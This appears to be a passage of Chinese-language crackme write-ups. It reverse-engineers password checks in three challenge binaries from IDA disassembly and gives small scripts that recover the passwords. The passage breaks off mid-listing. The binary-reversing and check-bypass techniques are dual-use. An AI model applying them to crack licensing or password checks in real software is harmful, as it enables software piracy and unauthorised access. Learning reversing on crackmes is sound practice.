\u5f53\u5bc6\u7801\u957f\u5ea6\u662f29\u65f6\u4f1a\u8df3\u5165loc_401635\u5faa\u73af .text:0000000000401635 loc_401635: ; CODE XREF: sub_4015D5+57\u2191j .text:0000000000401635 mov eax, [rbp+var_4] .text:0000000000401638 sub eax, 1 .text:000000000040163B cdqe .text:000000000040163D lea rdx, Buffer .text:0000000000401644 mov byte ptr [rax+rdx], 0 .text:0000000000401648 lea rax, Buffer .text:000000000040164F mov rcx, rax .text:0000000000401652 call near ptr sub_401670 .text:0000000000401657 test eax, eax .text:0000000000401659 jz short loc_401662 .text:000000000040165B call sub_4015B3 .text:0000000000401660 jmp short loc_401667 \u8fd9\u4e2a\u5faa\u73af\u628a\u8f93\u5165\u7684\u5bc6\u7801\u4f5c\u4e3a\u53c2\u6570\u7ed9\u4e86sub_401670 .text:0000000000401670 sub_401670 proc far ; CODE XREF: sub_4015D5+7D\u2191p .text:0000000000401670 push rbp .text:0000000000401671 mov rbp, rsp .text:0000000000401674 sub rsp, 8 .text:0000000000401678 lea esi, word_4016D6 .text:000000000040167F lea edi, byte_4016F3 .text:0000000000401686 mov [rsp+8+var_4], 23h ; '#' .text:000000000040168E call $+5 .text:0000000000401693 pop rdx .text:0000000000401694 add edx, 8 .text:0000000000401697 mov [rsp], edx .text:000000000040169A retf call $+5 \u4ee3\u8868\u5f53\u524d\u5730\u5740\u7684\u6307\u4ee4\u504f\u79fb\uff0c\u5373push \u5f53\u524d\u5730\u5740+5\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u90a3\u6761\u6307\u4ee4\u3002 \u6b64\u65f6rdx\u662f0x40168e + 0x5 = 0x401693\u3002\u7136\u540e\u53c8\u52a0\u4e868\u53d8\u62100x40169B\uff0c\u6700\u540ersp\u7684\u5730\u5740\u662f0x40169b\u3002 \u51fd\u6570\u6700\u540e\u8fd4\u56de\u5230\u4e860x40169b\u5730\u5740\u3002 sub_40169B\u662f\u8ba1\u7b97\u5bc6\u7801\u7684\u903b\u8f91\u51fd\u6570\u3002 .text:000000000040169B sub_40169B proc far .text:000000000040169B xor edx, edx .text:000000000040169D .text:000000000040169D loc_40169D: ; CODE XREF: sub_40169B+20\u2193j .text:000000000040169D cmp edx, 1Dh .text:00000000004016A0 jz short loc_4016BE .text:00000000004016A2 mov al, [rsi] .text:00000000004016A4 mov bl, r8b .text:00000000004016A7 xchg ecx, esi .text:00000000004016A9 mov al, [rsi] .text:00000000004016AB xchg r9d, esi .text:00000000004016AE add bl, al .text:00000000004016B0 xchg edi, esi .text:00000000004016B2 mov al, [rsi] .text:00000000004016B4 xchg r15d, esi .text:00000000004016B7 cmp al, bl .text:00000000004016B9 jnz short loc_4016C5 .text:00000000004016BB jmp short loc_40169D .text:00000000004016BE ; --------------------------------------------------------------------------- .text:00000000004016BE .text:00000000004016BE loc_4016BE: ; CODE XREF: sub_40169B+5\u2191j .text:00000000004016BE mov eax, 1 .text:00000000004016C3 jmp short loc_4016C7 .text:00000000004016C5 ; --------------------------------------------------------------------------- .text:00000000004016C5 .text:00000000004016C5 loc_4016C5: ; CODE XREF: sub_40169B+1E\u2191j .text:00000000004016C5 xor eax, eax .text:00000000004016C7 .text:00000000004016C7 loc_4016C7: ; CODE XREF: sub_40169B+28\u2191j .text:00000000004016C7 push 33h ; '3' .text:00000000004016C9 call $+5 .text:00000000004016CE pop rdx .text:00000000004016CF add edx, 6 .text:00000000004016D2 push rdx .text:00000000004016D3 retf .text:00000000004016D3 sub_40169B endp ; sp-analysis failed \u5173\u952e\u5faa\u73af\u903b\u8f91 bool valid_pass(char *Buffer) { for (size_t i = 0; i < 29; i++) if (byte_4016F3[i] != word_4016D6[i] + Buffer[i]) return false; return true; } byte_4016F3\u548cword_4016D6\u5b9a\u4e49 .text:00000000004016D6 dw 3D97h .text:00000000004016D8 dq 38FC3924A80239B1h, 0C1750C286B32255Ah, 914B0418D7212A24h .text:00000000004016F3 db 0F9h, 0AFh, 13h, 0B4h, 75h .text:00000000004016F8 dq 0A68ACC976EA2851Ch, 80999820EE6D9FCAh, 4284BCF6C1657D3Fh \u89e3\u5bc6\u4ee3\u7801 char byte_4016F3[] = \"\\xF9\\xAF\\x13\\xB4\\x75\\x1C\\x85\\xA2\\x6E\\x97\\xCC\\x8A\\xA6\\xCA\\x9F\\x6D\\xEE\\x20\\x98\\x99\\x80\\x3F\\x7D\\x65\\xC1\\xF6\\xBC\\x84\"; char word_4016D6[] = \"\\x97\\x3D\\xB1\\x39\\x02\\xA8\\x24\\x39\\xFC\\x38\\x5A\\x25\\x32\\x6B\\x28\\x0C\\x75\\xC1\\x24\\x2A\\x21\\xD7\\x18\\x04\\x4B\\x91\\x4E\\x07\"; for (size_t i = 0; i < 29; i++) printf(\"%c\", (byte_4016F3[i] - word_4016D6[i]) & 0xff); majorsopa's crackme0 b\u51fd\u6570\u8bfb\u53d6\u8f93\u5165 .text:0000000140005FC1 sub rsp, 90h .text:0000000140005FC8 call __main .text:0000000140005FCD lea rbx, [rsp+98h+var_6C] .text:0000000140005FD2 mov rcx, rbx .text:0000000140005FD5 call b .text:0000000140001455 b proc near ; CODE XREF: main+15\u2193p .text:0000000140001455 push rbx .text:0000000140001456 sub rsp, 20h .text:000000014000145A mov rbx, rcx .text:000000014000145D lea rcx, Format ; \"Enter password: \" .text:0000000140001464 call printf .text:0000000140001469 mov rcx, rbx .text:000000014000146C add rsp, 20h .text:0000000140001470 pop rbx .text:0000000140001471 jmp gets .text:0000000140001471 b endp c\u51fd\u6570\u8ba1\u7b97\u8f93\u5165\u7684\u5b57\u7b26\u957f\u5ea6 .text:0000000140005FDA mov rcx, rbx .text:0000000140005FDD call a .text:0000000140001447 a proc near ; CODE XREF: e:loc_140001511\u2193p .text:0000000140001447 ; main+1D\u2193p .text:0000000140001447 ; DATA XREF: ... .text:0000000140001447 sub rsp, 28h .text:000000014000144B call strlen .text:0000000140001450 add rsp, 28h .text:0000000140001454 retn .text:0000000140001454 a endp loc_14000600A\u5faa\u73af\u662f\u5931\u8d25\u6d41\u7a0b\u3002 \u5f53\u8f93\u5165\u7684\u5b57\u7b26\u5c0f\u4e8e\u7b49\u4e8e7\u65f6\u5931\u8d25\u3002\u8868\u793a\u5bc6\u7801\u5927\u4e8e\u7b49\u4e8e8 .text:0000000140005FE2 cmp eax, 7 .text:0000000140005FE5 jle short loc_14000600A al\u5bc4\u5b58\u5668\u4e0e1\u8fdb\u884cand\u64cd\u4f5c\uff0c\u5224\u65adal\u5bc4\u5b58\u5668\u662f\u5426\u4e3a\u5947\u6570\u3002\u5982\u679c\u662f\u5947\u6570\u5219zf\u8bbe\u4e3a0\uff0c\u5426\u5219\u4e3a1 jnz\u5f53zf\u4f4d\u662f0\u65f6\uff08strlen\u7684\u8fd4\u56de\u503c\u662f\u5947\u6570\uff09\uff0c\u5219\u5931\u8d25\u3002\u6240\u4ee5\u5bc6\u7801\u5fc5\u987b\u662f\u5076\u6570\u3002 .text:0000000140005FE7 test al, 1 .text:0000000140005FE9 jnz short loc_14000600A \u63a5\u7740\u8c03\u7528c\u51fd\u6570\u3002 \u5f53\u8fdb\u5165loc_14000148D\u65f6\uff0c\u8fd4\u56de\u503c\u8bbe\u4e3a1\uff0c\u5e76\u9000\u51fac\u51fd\u6570\u3002 \u51fd\u6570\u7ed3\u675f\u540e\u5f53\u8fd4\u56de\u503c\u4e3a0\u65f6\uff0c\u8fdb\u5165\u5931\u8d25\u6d41\u7a0b\u3002 .text:0000000140005FEB mov rcx, rbx .text:0000000140005FEE call c .text:0000000140001476 c proc near ; CODE XREF: c+11\u2193j .text:0000000140001476 ; main+2E\u2193p .text:0000000140001476 ; DATA XREF: ... .text:0000000140001476 mov al, [rcx] .text:0000000140001478 test al, al .text:000000014000147A jz short loc_14000148D .text:000000014000147C and eax, 0FFFFFFDFh .text:000000014000147F inc rcx .text:0000000140001482 sub eax, 41h ; 'A' .text:0000000140001485 cmp al, 19h .text:0000000140001487 jbe short c .text:0000000140001489 xor eax, eax .text:000000014000148B jmp short locret_140001492 .text:000000014000148D .text:000000014000148D loc_14000148D: ; CODE XREF: c+4\u2191j .text:000000014000148D mov eax, 1 .text:0000000140001492 .text:0000000140001492 locret_140001492: ; CODE XREF: c+15\u2191j .text:0000000140001492 retn .text:0000000140001492 c endp .text:0000000140005FF3 test eax, eax .text:0000000140005FF5 jz short loc_14000600A \u4ed4\u7ec6\u770b\u770b\u8fd9\u91cc\u7684\u5c0f\u5faa\u73af mov al, [rcx] //\u5b58\u50a8\u5bc6\u7801\u7684\u5730\u5740\u7ed9rax\u4f4e8\u4f4d\uff1b\u7b2c\u4e8c\u6b21\u7531\u4e8ercx\u5730\u5740+1\uff0c\u6240\u4ee5\u6307\u5411\u4e0b\u4e00\u4e2a\u5bc6\u7801\u5b57\u7b26 test al, al //and al\uff0cal\u4e3a0\u65f6\u8df3\u8f6c\u5230loc_14000148D\uff0cloc_14000148D\u662f\u6b63\u786e\u6d41\u7a0b jz short loc_14000148D //jump zero ZF=1 and eax, 0FFFFFFDFh //eax \u4e0e0xDF and\u64cd\u4f5c inc rcx //rcx \u81ea\u52a0 sub eax, 41h ; 'A' // eax\u51cf 0x41\uff0cASCII\u662fA cmp al, 19h //al\u4e0e0x19\u6bd4\u8f83\u662f\u5426\u76f8\u7b49 jbe short c //0x19\u5927\u4e8e\u7b49\u4e8eal\u65f6\u91cd\u590d\u5faa\u73af \u8fd9\u53ef\u80fd\u662f\u904d\u5386\u68c0\u6d4b\u5bc6\u7801\u5b57\u7b26\u662f\u5426\u5408\u6cd5\u7684\u5224\u65ad for i in range(0,256): if ((i & 0xDF) - 0x41) & 0xFF <= 0x19: print(f'{hex(i)} {chr(i)}') \u6240\u4ee5\u5bc6\u7801\u7ec4\u6210\u662f\u5927\u5c0f\u5199\u7684a-z \u63a5\u4e0b\u6765\u8fd8\u6709\u4e00\u4e2ae\u51fd\u6570\uff0ce\u51fd\u6570\u8fd4\u56de\u975e0\u65f6\u7a0b\u5e8f\u8fdb\u5165\u6700\u7ec8\u7684\u6210\u529f\u63d0\u793a\u3002 .text:0000000140005FF7 mov rcx, rbx .text:0000000140005FFA call e .text:0000000140005FFF lea rcx, aCorrect ; \"Correct\" .text:0000000140006006 test eax, eax .text:0000000140006008 jnz short loc_140006011 .text:000000014000600A \u6574\u4e2ae\u51fd\u6570\u5305\u542b\u4e86\u5927\u91cf\u7684\u5faa\u73af\u3002 \u9996\u5148e\u8c03\u7528\u4e86d .text:00000001400014B7 e proc near ; CODE XREF: main+3A\u2193p .text:00000001400014B7 ; DATA XREF: .pdata:000000014000909C\u2193o ... .text:00000001400014B7 .text:00000001400014B7 var_4A = byte ptr -4Ah .text:00000001400014B7 .text:00000001400014B7 push rsi .text:00000001400014B8 push rbx .text:00000001400014B9 sub rsp, 68h .text:00000001400014BD xor esi, esi .text:00000001400014BF lea r10, [rsp+2Eh] .text:00000001400014C4 mov rdx, r10 .text:00000001400014C7 call d d\u51fd\u6570\u5982\u4e0b .text:0000000140001493 xor eax, eax .text:0000000140001495 .text:0000000140001495 loc_140001495: ; CODE XREF: d+1E\u2193j .text:0000000140001495 mov r8b, [rcx+rax] .text:0000000140001499 lea r9d, [rax+1] .text:000000014000149D test r8b, r8b .text:00000001400014A0 jz short loc_1400014B3 .text:00000001400014A2 and r9b, 1 .text:00000001400014A6 jnz short loc_1400014AE .text:00000001400014A8 mov [rdx], r8b .text:00000001400014AB inc rdx .text:00000001400014AE .text:00000001400014AE loc_1400014AE: ; CODE XREF: d+13\u2191j .text:00000001400014AE inc rax .text:00000001400014B1 jmp short loc_140001495 .text:00000001400014B3 ; --------------------------------------------------------------------------- .text:00000001400014B3 .text:00000001400014B3 loc_1400014B3: ; CODE XREF: d+D\u2191j .text:00000001400014B3 mov byte ptr [rdx], 0 .text:00000001400014B6 retn .text:00000001400014B6 d endp d\u770b\u8d77\u6765\u6709\u4e9b\u590d\u6742\uff0c\u4f46\u662f\u5728x64dbg\u4e2d\u53ef\u4ee5\u770b\u5230d\u51fd\u6570\u901a\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\u4e4b\u540e\u8fd4\u56de\u4e86\u5076\u6570\u4f4d\u7684\u5b57\u7b26 \u968f\u540e\u5728loc_1400014CF\u5faa\u73af\u4e2d\u628ad\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6309\u4f4d\u53c8\u8fdb\u884c\u4e86\u8fd0\u7b97\u3002 .text:00000001400014CC mov rdx, rcx .text:00000001400014CF .text:00000001400014CF loc_1400014CF: ; CODE XREF: e+27\u2193j .text:00000001400014CF mov al, [rdx] .text:00000001400014D1 add rdx, 2 .text:00000001400014D5 test al, al .text:00000001400014D7 jz short loc_1400014E0 .text:00000001400014D9 and eax, 0Fh .text:00000001400014DC add esi, eax .text:00000001400014DE jmp short loc_1400014CF .text:00000001400014E0 ; --------------------------------------------------------------------------- .text:00000001400014E0 .text:00000001400014E0 loc_1400014E0: ; CODE XREF: e+20\u2191j .text:00000001400014E0 mov rdx, r10 .text:00000001400014E3 xor ebx, ebx .text:00000001400014E5 \u968f\u540e\u628a\u5bc6\u7801\u7684\u5947\u6570\u4f4d\u8fdb\u884c\u4e86\u5224\u65ad\uff0c\u53c8\u5c06\u5947\u6570\u4f4d\u548c\u5076\u6570\u4f4d\u8fdb\u884c%\u8fd0\u7b97\u3002\u590d\u6742\u7684\u8fd0\u7b97\u903b\u8f91\u53ef\u4ee5\u76f4\u63a5\u4e22GPT .text:00000001400014E5 loc_1400014E5: ; CODE XREF: e+58\u2193j .text:00000001400014E5 mov al, [rdx] .text:00000001400014E7 test al, al .text:00000001400014E9 jz short loc_140001511 .text:00000001400014EB lea r8d, [rax-61h] .text:00000001400014EF cmp r8b, 5 .text:00000001400014F3 ja short loc_1400014FA .text:00000001400014F5 sub eax, 57h ; 'W' .text:00000001400014F8 jmp short loc_140001507 .text:00000001400014FA ; --------------------------------------------------------------------------- .text:00000001400014FA .text:00000001400014FA loc_1400014FA: ; CODE XREF: e+3C\u2191j .text:00000001400014FA lea r8d, [rax-41h] .text:00000001400014FE cmp r8b, 5 .text:0000000140001502 ja short loc_140001539 .text:0000000140001504 sub eax, 37h ; '7' .text:0000000140001507 .text:0000000140001507 loc_140001507: ; CODE XREF: e+41\u2191j .text:0000000140001507 movsx eax, al .text:000000014000150A inc rdx .text:000000014000150D add ebx, eax .text:000000014000150F jmp short loc_1400014E5 .text:0000000140001511 ; --------------------------------------------------------------------------- .text:0000000140001511 .text:0000000140001511 loc_140001511: ; CODE XREF: e+32\u2191j .text:0000000140001511 call a .text:0000000140001516 mov ecx, eax .text:0000000140001518 lea r8d, [rsi+rax] .text:000000014000151C add ecx, ebx .text:000000014000151E cmp esi, ebx .text:0000000140001520 jge short loc_14000152A .text:0000000140001522 mov eax, ecx .text:0000000140001524 cdq .text:0000000140001525 idiv r8d .text:0000000140001528 jmp short loc_140001530 .text:000000014000152A ; --------------------------------------------------------------------------- .text:000000014000152A .text:000000014000152A loc_14000152A: ; CODE XREF: e+69\u2191j .text:000000014000152A mov eax, r8d .text:000000014000152D cdq .text:000000014000152E idiv ecx .text:0000000140001530 .text:0000000140001530 loc_140001530: ; CODE XREF: e+71\u2191j .text:0000000140001530 xor eax, eax .text:0000000140001532 test edx, edx .text:0000000140001534 setz al .text:0000000140001537 jmp short loc_14000153B .text:0000000140001539 ; --------------------------------------------------------------------------- .text:0000000140001539 .text:0000000140001539 loc_140001539: ; CODE XREF: e+4B\u2191j .text:0000000140001539 xor eax, eax .text:000000014000153B .text:000000014000153B loc_14000153B: ; CODE XREF: e+80\u2191j .text:000000014000153B add rsp, 68h .text:000000014000153F pop rbx .text:0000000140001540 pop rsi .text:0000000140001541 retn .text:0000000140001541 e endp \u6709\u591a\u4e2a\u89e3\u6cd5\uff0c\u4f46\u6700\u7b80\u5355\u7684\u5bc6\u7801\u662f8\u4e2aa Dojas's find the encryptor \u641c\u7d22\u4e0d\u5230\u9519\u8bef\u63d0\u793a\uff0c\u5b57\u7b26\u88ab\u52a0\u5bc6\u4e86 crackme.401721 \u662f\u8d1f\u8d23\u52a0\u5bc6\u7684\u51fd\u6570\uff0c\u8c03\u8bd5\u5230\u8fd9\u91cc\u4e4b\u540e\u8f93\u5165\u7684\u5bc6\u7801\u8fdb\u884c\u4e86\u52a0\u5bc6 123\u52a0\u5bc6\u6210\u4e86 49 100 153 \u4ee3\u7801\u5982\u4e0b\uff0c\u633a\u590d\u6742\u7684.... .text:00401721 encode proc near ; CODE XREF: jio(std::string)+92\u2193p .text:00401721 .text:00401721 var_68 = dword ptr -68h .text:00401721 var_64 = dword ptr -64h .text:00401721 lpuexcpt = dword ptr -60h .text:00401721 fctx = SjLj_Function_Context ptr -5Ch .text:00401721 var_38 = dword ptr -38h .text:00401721 var_34 = dword ptr -34h .text:00401721 var_1C = byte ptr -1Ch .text:00401721 var_18 = byte ptr -18h .text:00401721 var_14 = dword ptr -14h .text:00401721 var_10 = dword ptr -10h .text:00401721 var_8 = byte ptr -8 .text:00401721 arg_0 = dword ptr 8 .text:00401721 arg_4 = dword ptr 0Ch .text:00401721 .text:00401721 push ebp .text:00401722 mov ebp, esp .text:00401724 sub esp, 88h .text:0040172A lea eax, [ebp+var_8] .text:0040172D mov [ebp+fctx.personality], offset ___gxx_personality_sj0 .text:00401734 mov [ebp+fctx.lsda], offset word_4868B2 .text:0040173B mov [ebp+var_38], offset loc_401838 .text:00401742 mov [ebp+var_34], esp .text:00401745 mov [ebp+fctx.jbuf], eax .text:00401748 lea eax, [ebp+fctx] .text:0040174B mov [esp], eax ; this .text:0040174E call __Unwind_SjLj_Register .text:00401753 ; __unwind { // ___gxx_personality_sj0 .text:00401753 ; try { .text:00401753 mov ecx, [ebp+arg_0] .text:00401756 mov [ebp+fctx.call_site], 0FFFFFFFFh .text:0040175D call __ZNSsC1Ev ; std::string::string(void) .text:00401762 mov eax, [ebp+arg_4] .text:00401765 mov ecx, [ebp+arg_4] .text:00401768 mov eax, [eax] .text:0040176A mov [ebp+lpuexcpt], eax .text:0040176D call __ZNKSs3endEv ; std::string::end(void) .text:00401772 mov [ebp+var_68], eax .text:00401775 .text:00401775 loc_401775: ; CODE XREF: encode+112\u2193j .text:00401775 mov edx, [ebp+var_68] .text:00401778 cmp [ebp+lpuexcpt], edx .text:0040177B jz loc_40188B .text:00401781 mov eax, [ebp+lpuexcpt] .text:00401784 movsx eax, byte ptr [eax] .text:00401787 mov [ebp+var_64], eax .text:0040178A mov eax, [ebp+arg_0] .text:0040178D mov [esp+4], eax .text:00401791 lea eax, [ebp+var_14] .text:00401794 mov [esp], eax ; std::string * .text:00401797 mov [ebp+fctx.call_site], 1 .text:0040179E call __Z2spRKSs ; sp(std::string const&) .text:004017A3 mov eax, [ebp+var_10] .text:004017A6 sub eax, [ebp+var_14] .text:004017A9 sar eax, 2 .text:004017AC inc eax .text:004017AD imul eax, [ebp+var_64] .text:004017B1 mov dword ptr [esp+0Ch], offset unk_490000 .text:004017B9 mov dword ptr [esp+8], 10h .text:004017C1 mov dword ptr [esp+4], offset __ZL9vsnprintfPcjPKcS_ ; char * .text:004017C9 mov [esp+10h], eax .text:004017CD lea eax, [ebp+var_1C] .text:004017D0 mov [esp], eax .text:004017D3 mov [ebp+fctx.call_site], 2 .text:004017DA call __ZN9__gnu_cxx12__to_xstringISscEET_PFiPT0_jPKS2_PcEjS5_z ; __gnu_cxx::__to_xstring<std::string,char>(int (*)(char *,uint,char const*,char *),uint,char const*,...) .text:004017DF lea ecx, [ebp+var_1C] .text:004017E2 mov dword ptr [esp], offset unk_490003 ; this .text:004017E9 mov [ebp+fctx.call_site], 3 .text:004017F0 call __ZNSs6appendEPKc ; std::string::append(char const*) .text:004017F5 push ecx .text:004017F6 lea ecx, [ebp+var_18] .text:004017F9 mov [esp], eax .text:004017FC call __ZNSsC1EOSs ; std::string::string(std::string &&) .text:00401801 lea eax, [ebp+var_18] .text:00401804 push edx .text:00401805 mov [esp], eax .text:00401808 mov ecx, [ebp+arg_0] .text:0040180B mov [ebp+fctx.call_site], 4 .text:00401812 call __ZNSspLERKSs ; std::string::operator+=(std::string const&) .text:00401817 lea ecx, [ebp+var_18] .text:0040181A push eax ; this .text:0040181B call __ZNSsD1Ev ; std::string::~string() .text:00401820 lea ecx, [ebp+var_1C] .text:00401823 call __ZNSsD1Ev ; std::string::~string() .text:00401828 lea ecx, [ebp+var_14] .text:0040182B call __ZNSt6vectorISsSaISsEED4Ev_isra_49 ; std::vector<std::string,std::allocator<std::string>>::~vector() [clone] .text:00401830 inc [ebp+lpuexcpt] .text:00401833 jmp loc_401775 .text:00401838 ; --------------------------------------------------------------------------- .text:00401838 .text:00401838 loc_401838: ; DATA XREF: encode+1A\u2191o .text:00401838 ; cleanup() // owned by 401753 .text:00401838 add ebp, 8 .text:0040183B mov eax, [ebp+fctx.data] .text:0040183E mov [ebp+lpuexcpt], eax .text:00401841 mov eax, [ebp+fctx.call_site] .text:00401844 test eax, eax .text:00401846 jz short loc_401871 .text:00401848 dec eax .text:00401849 jnz short loc_401855 .text:0040184B .text:0040184B loc_40184B: ; CODE XREF: encode+13F\u2193j .text:0040184B lea ecx, [ebp+var_14] .text:0040184E call __ZNSt6vectorISsSaISsEED4Ev_isra_49 ; std::vector<std::string,std::allocator<std::string>>::~vector() [clone] .text:00401853 jmp short loc_401871 .text:00401855 ; --------------------------------------------------------------------------- .text:00401855 .text:00401855 loc_401855: ; CODE XREF: encode+128\u2191j .text:00401855 dec eax .text:00401856 jnz short loc_401862 .text:00401858 .text:00401858 loc_401858: ; CODE XREF: encode+14C\u2193j .text:00401858 lea ecx, [ebp+var_1C] .text:0040185B call __ZNSsD1Ev ; std::string::~string() .text:00401860 jmp short loc_40184B .text:00401862 ; --------------------------------------------------------------------------- .text:00401862 .text:00401862 loc_401862: ; CODE XREF: encode+135\u2191j .text:00401862 dec eax .text:00401863 jnz short loc_40186F .text:00401865 lea ecx, [ebp+var_18] .text:00401868 call __ZNSsD1Ev ; std::string::~string() .text:0040186D jmp short loc_401858 .text:0040186F ; --------------------------------------------------------------------------- .text:0040186F .text:0040186F loc_40186F: ; CODE XREF: encode+142\u2191j .text:0040186F ud2 .text:00401871 ; --------------------------------------------------------------------------- .text:00401871 .text:00401871 loc_401871: ; CODE XREF: encode+125\u2191j .text:00401871 ; encode+132\u2191j .text:00401871 mov ecx, [ebp+arg_0] .text:00401874 call __ZNSsD1Ev ; std::string::~string() .text:00401879 mov eax, [ebp+lpuexcpt] .text:0040187C mov [esp], eax ; lpuexcpt .text:0040187F mov [ebp+fctx.call_site], 0FFFFFFFFh .text:00401886 call __Unwind_SjLj_Resume .text:0040188B ; --------------------------------------------------------------------------- .text:0040188B .text:0040188B loc_40188B: ; CODE XREF: encode+5A\u2191j .text:0040188B lea eax, [ebp+fctx] .text:0040188E mov [esp], eax ; lpfctx .text:00401891 call __Unwind_SjLj_Unregister .text:00401896 mov eax, [ebp+arg_0] .text:00401899 leave .text:0040189A retn .text:0040189A ; } // starts at 401753 .text:0040189A ; } // starts at 401753 .text:0040189A encode endp \u7ee7\u7eed\u8c03\u8bd5\u53ef\u77e5\u9053\u89e3\u5bc6\u51fd\u6570 text:0040189B push ebp .text:0040189C mov ebp, esp .text:0040189E push ebx .text:0040189F lea eax, [ebp+var_8] .text:004018A2 sub esp, 74h .text:004018A5 mov [ebp+fctx.personality], offset ___gxx_personality_sj0 .text:004018AC mov [ebp+fctx.lsda], offset word_4868BE .text:004018B3 mov [ebp+fctx.jbuf], eax .text:004018B6 lea eax, [ebp+fctx] .text:004018B9 mov [ebp+var_24], esp .text:004018BC mov [ebp+var_28], offset loc_4019E7 .text:004018C3 mov [esp], eax ; lpfctx .text:004018C6 call __Unwind_SjLj_Register .text:004018CB ; __unwind { // ___gxx_personality_sj0 .text:004018CB ; try { .text:004018CB lea eax, [ebp+var_C] .text:004018CE mov dword ptr [esp], offset byte_490005 ; char * .text:004018D5 mov [esp+4], eax ; int .text:004018D9 mov ecx, [ebp+arg_0] .text:004018DC mov [ebp+fctx.call_site], 0FFFFFFFFh .text:004018E3 call __ZNSsC1EPKcRKSaIcE ; std::string::string(char const*,std::allocator<char> const&) .text:004018E8 push edx .text:004018E9 push edx ; this .text:004018EA mov eax, [ebp+arg_4] .text:004018ED mov eax, [eax+4] .text:004018F0 mov [ebp+lpuexcpt], eax .text:004018F3 lea eax, [ebp+var_C] .text:004018F6 mov [ebp+EndPtr], eax .text:004018F9 .text:004018F9 loc_4018F9: ; CODE XREF: decode+112\u2193j .text:004018F9 mov eax, [ebp+arg_4] .text:004018FC mov ebx, [ebp+lpuexcpt] .text:004018FF cmp ebx, [eax] .text:00401901 jz loc_4019B2 .text:00401907 sub [ebp+lpuexcpt], 4 .text:0040190B mov eax, [ebp+lpuexcpt] .text:0040190E mov eax, [eax] .text:00401910 mov [ebp+fctx.call_site], 1 .text:00401917 mov [ebp+String], eax .text:0040191A call ds:__imp___errno .text:00401920 mov dword ptr [eax], 0 .text:00401926 mov dword ptr [esp+8], 0Ah ; Radix .text:0040192E mov eax, [ebp+EndPtr] .text:00401931 mov [esp+4], eax ; EndPtr .text:00401935 mov eax, [ebp+String] .text:00401938 mov [esp], eax ; String .text:0040193B call _strtol .text:00401940 mov [ebp+var_58], eax .text:00401943 mov eax, [ebp+String] .text:00401946 cmp [ebp+var_C], eax .text:00401949 jnz short loc_401957 .text:0040194B mov dword ptr [esp], offset aStoi ; \"stoi\" .text:00401952 call __ZSt24__throw_invalid_argumentPKc ; std::__throw_invalid_argument(char const*) .text:00401957 ; --------------------------------------------------------------------------- .text:00401957 .text:00401957 loc_401957: ; CODE XREF: decode+AE\u2191j .text:00401957 mov [ebp+fctx.call_site], 1 .text:0040195E call ds:__imp___errno .text:00401964 cmp dword ptr [eax], 22h ; '\"' .text:00401967 jz loc_401A0A .text:0040196D mov eax, [ebp+arg_4] .text:00401970 mov edx, [eax+4] .text:00401973 mov eax, [eax] .text:00401975 mov byte ptr [esp+0Ch], 0 .text:0040197A mov ebx, [ebp+lpuexcpt] .text:0040197D mov [esp+4], edx ; char .text:00401981 mov [esp], eax .text:00401984 mov [esp+8], ebx .text:00401988 call __ZSt9__find_ifIN9__gnu_cxx17__normal_iteratorIPKSsSt6vectorISsSaISsEEEENS0_5__ops16_Iter_equals_valIS2_EEET_SB_SB_T0_St26random_access_iterator_tag ; std::__find_if<__gnu_cxx::__normal_iterator<std::string const*,std::vector<std::string,std::allocator<std::string>>>,__gnu_cxx::__ops::_Iter_equals_val<std::string const>>(__gnu_cxx::__normal_iterator<std::string const*,std::vector<std::string,std::allocator<std::string>>>,__gnu_cxx::__normal_iterator<std::string const*,std::vector<std::string,std::allocator<std::string>>>,__gnu_cxx::__ops::_Iter_equals_val<std::string const>,std::random_access_iterator_tag) .text:0040198D mov ebx, [ebp+arg_4] .text:00401990 sub eax, [ebx] .text:00401992 sar eax, 2 .text:00401995 lea ecx, [eax+1] .text:00401998 mov eax, [ebp+var_58] .text:0040199B cdq .text:0040199C idiv ecx .text:0040199E movsx eax, al .text:004019A1 mov [esp], eax ; this .text:004019A4 mov ecx, [ebp+arg_0] .text:004019A7 call __ZNSs9push_backEc ; std::string::push_back(char) .text:004019AC push eax .text:004019AD jmp loc_4018F9 .text:004019B2 ; --------------------------------------------------------------------------- .text:004019B2 .text:004019B2 loc_4019B2: ; CODE XREF: decode+66\u2191j .text:004019B2 mov ecx, [ebp+arg_0] .text:004019B5 mov [ebp+fctx.call_site], 1 .text:004019BC call __ZNSs3endEv ; std::string::end(void) .text:004019C1 mov ecx, [ebp+arg_0] .text:004019C4 mov [ebp+lpuexcpt], eax .text:004019C7 call __ZNSs5beginEv ; std::string::begin(void) .text:004019CC mov edx, [ebp+lpuexcpt] .text:004019CF dec edx .text:004019D0 cmp eax, [ebp+lpuexcpt] .text:004019D3 jz short loc_401A1D .text:004019D5 .text:004019D5 loc_4019D5: ; CODE XREF: decode+14A\u2193j .text:004019D5 cmp eax, edx .text:004019D7 jnb short loc_401A1D .text:004019D9 mov cl, [eax] .text:004019DB mov bl, [edx] .text:004019DD inc eax .text:004019DE dec edx .text:004019DF mov [eax-1], bl .text:004019E2 mov [edx+1], cl .text:004019E5 jmp short loc_4019D5 .text:004019E7 ; --------------------------------------------------------------------------- .text:004019E7 .text:004019E7 loc_4019E7: ; DATA XREF: decode+21\u2191o .text:004019E7 ; cleanup() // owned by 4018CB .text:004019E7 add ebp, 8 .text:004019EA mov eax, [ebp+fctx.data] .text:004019ED mov ecx, [ebp+arg_0] .text:004019F0 mov [ebp+lpuexcpt], eax .text:004019F3 call __ZNSsD1Ev ; std::string::~string() .text:004019F8 mov eax, [ebp+lpuexcpt] .text:004019FB mov [esp], eax ; lpuexcpt .text:004019FE mov [ebp+fctx.call_site], 0FFFFFFFFh .text:00401A05 call __Unwind_SjLj_Resume .text:00401A0A ; --------------------------------------------------------------------------- .text:00401A0A .text:00401A0A loc_401A0A: ; CODE XREF: decode+CC\u2191j .text:00401A0A mov dword ptr [esp], offset aStoi ; \"stoi\" .text:00401A11 mov [ebp+fctx.call_site], 1 .text:00401A18 call __ZSt20__throw_out_of_rangePKc ; std::__throw_out_of_range(char const*) .text:00401A1D ; --------------------------------------------------------------------------- .text:00401A1D .text:00401A1D loc_401A1D: ; CODE XREF: decode+138\u2191j .text:00401A1D ; decode+13C\u2191j .text:00401A1D lea eax, [ebp+fctx] .text:00401A20 mov [esp], eax ; lpfctx .text:00401A23 call __Unwind_SjLj_Unregister .text:00401A28 mov eax, [ebp+arg_0] .text:00401A2B mov ebx, [ebp+var_4] .text:00401A2E leave .text:00401A2F retn .text:00401A2F ; } // starts 